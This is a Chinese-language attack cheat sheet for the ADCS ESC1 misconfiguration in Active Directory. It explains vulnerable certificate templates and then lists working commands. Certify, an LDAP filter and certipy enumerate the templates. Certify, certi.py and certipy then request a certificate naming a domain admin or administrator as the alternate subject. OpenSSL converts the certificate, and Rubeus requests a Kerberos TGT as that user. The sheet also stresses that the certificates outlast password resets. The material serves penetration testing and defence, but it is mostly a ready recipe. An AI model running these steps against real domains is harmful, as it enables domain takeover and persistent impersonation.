	域用户可以注册VulnTemplate模板，该模板可用于客户端身份验证并设置了ENROLLEE_SUPPLIES_SUBJECT。这允许任何人注册此模板并指定任意主题备用名称（即作为 DA）。允许将其他身份绑定到主题之外的证书。
	要求：
	允许 AD 身份验证的模板
	ENROLLEE_SUPPLIES_SUBJECT标志
	[PKINIT] 客户端身份验证、智能卡登录、任何目的或无 EKU（扩展/增强密钥使用）
	使用Certify.exe查看是否有任何易受攻击的模板
	>Certify.exe find /vulnerable
	>Certify.exe find /vulnerable /currentuser
	或者
	PS> Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'
	或者
	>certipy 'domain.local'/'user':'password'@'domaincontroller' find -bloodhound
	用 Certify、Certi或Certipy请求证书并添加替代名称（用户模拟）
	通过在已提升的命令提示符下使用“/machine”参数执行 Certify 来请求机器帐户的证书。	>Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:domadmin
	>certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN
	>certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
	使用 OpenSSL 并转换证书，不要输入密码
	>openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
	将 cert.pfx 移动到目标机器文件系统并使用 Rubeus 为 altname 用户请求 TGT
	>Rubeus.exe asktgt /user:domadmin /certificate:C:\Temp\cert.pfx
	即使用户或计算机重置密码，这些证书仍然可用！